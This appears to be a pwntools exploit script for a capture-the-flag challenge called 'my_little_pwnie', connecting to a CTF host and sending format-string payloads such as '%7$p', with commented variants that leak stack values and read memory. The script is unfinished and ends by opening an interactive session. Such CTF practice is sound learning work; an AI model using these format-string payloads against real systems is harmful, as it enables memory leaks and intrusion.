from pwn import *
context.log_level="debug"
context.terminal=["terminator", "-e"]
elf_name = "./my_little_pwnie"
elf = ELF(elf_name)
elf.address = 0
context.binary=elf
#DEBUG
# libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so")
# r = process("./launch.sh", shell=True)

# REMOTE
# libc = ELF("./libc.so.6")
r = remote("pwnie.zajebistyc.tf", 17003)
# r = process(elf_name)
# payload1 = "%13$p,%15$p,%34$p,%94$s"
# payload1 = "%7$p%9$p"
payload1 ="%7$p"
# gdb.attach(r)
# gdb.attach(r, '''
# b printf
# c
# ''')
# raw_input("debug1")
r.sendline(payload1)
response1 = r.recvline()
payload2 = "x"
r.sendline(payload2)
r.recvrepeat(0.5)
r.interactive()